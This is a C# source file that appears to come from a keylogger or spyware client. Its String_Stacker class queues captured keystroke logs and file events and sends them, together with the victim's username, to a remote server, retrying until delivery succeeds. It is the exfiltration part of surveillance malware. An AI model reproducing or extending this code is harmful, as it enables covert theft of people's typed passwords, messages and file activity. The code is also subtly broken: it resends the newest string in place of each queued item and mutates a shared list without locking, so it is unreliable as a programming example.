using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Communication
{
    /// <summary>
    /// A class that stacks Keylog send requests incase they didn't send to the server.
    /// </summary>
    public static class String_Stacker
    {
        public enum StringType
        {
            Keylog, FileEvent
        }
        private static List<Tuple<string, StringType>> _sdata = new List<Tuple<string, StringType>>();
        public static async void Send(string sdata, StringType type)
        {
            var data = new Tuple<string, StringType>(sdata, type);
            _sdata.Add(data);
            await Task.Run(() =>
            {
                bool failed = false;
                /// Make sure they are sent in order.
                foreach (var i in _sdata.ToList())
                {
                    switch (i.Item2)
                    {
                        case StringType.Keylog:
                            if (Server.AsyncSendString(sdata, Environment.UserName, "logs").Result)
                            {
                                _sdata.Remove(i);
                            }
                            else failed = true;
                            break;
                        case StringType.FileEvent:
                            if (Server.AsyncSendString(sdata, Environment.UserName, "fileevent").Result)
                            {
                                _sdata.Remove(i);
                            }
                            else failed = true;
                            break;
                    }
                    if (failed) break;
                }
            });
        }
    }
}
